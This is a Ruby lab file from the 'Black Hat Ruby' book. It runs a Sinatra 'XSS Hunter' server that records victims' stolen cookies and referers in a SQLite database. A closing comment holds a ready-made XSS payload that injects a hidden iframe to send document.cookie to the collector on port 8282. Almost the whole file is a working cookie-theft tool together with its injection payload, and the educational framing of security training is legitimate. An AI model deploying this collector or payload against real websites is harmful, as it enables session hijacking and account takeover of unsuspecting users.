#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   XSS Hunter to store victims' stolen cookies
# Requirements:
#   sudo apt-get install libsqlite3-dev
#   gem install sinatra activerecord sqlite3
#   ruby xss-hunter.rb
#

begin
  require 'sinatra'
  require 'active_record'
  require 'sinatra/base'
rescue => exception
  gemfile do
    source 'https://rubygems.org'
    gem 'sinatra', require: 'sinatra'
    gem 'sinatra', require: 'activerecord'
    gem 'sinatra', require: 'sqlite3'
  end
  require 'sinatra/base'
end

class Sessions < ActiveRecord::Base
  def self.setup_database
    ActiveRecord::Base.establish_connection(
      adapter:  "sqlite3",
      dbfile:   ":memory:",
      database: "xss-hunter.db",
      pool:     50
    )
    unless ActiveRecord::Base.connection.table_exists? :sessions
      ActiveRecord::Schema.define do
        create_table :sessions do |table|
            table.column :target,     :string
            table.column :cookie,     :string
            table.column :created_at, :datetime
        end
      end
    end
  end
end

Sessions.setup_database

class XssHunter < Sinatra::Base
  configure {
    set :port, 8282
    set :environment, :production
  }

  get '/' do
    'Black Hat Ruby'
  end

  get '/:cookie' do
    Sessions.create!(target: request.referer, cookie: params[:cookie], created_at: Time.now)
  end

  after do
    response['Server']                        = 'BHR!'
    response['Access-Control-Allow-Methods']  = 'POST, PUT, DELETE, GET, OPTIONS'
    response['Access-Control-Allow-Headers']  = 'Origin, X-Requested-With, Content-Type, Accept, Authorization'
    response['Access-Control-Allow-Origin']   = '*'
    response['Access-Control-Request-Method'] = '*'
    response['X-Frame-Options']               = '*'
  end

end

XssHunter.run!


# <script>document.documentElement.innerHTML+='<iframe src="http://localhost:8282/'+escape(document.cookie)+'" height=0 width=0 border=none />';  </script>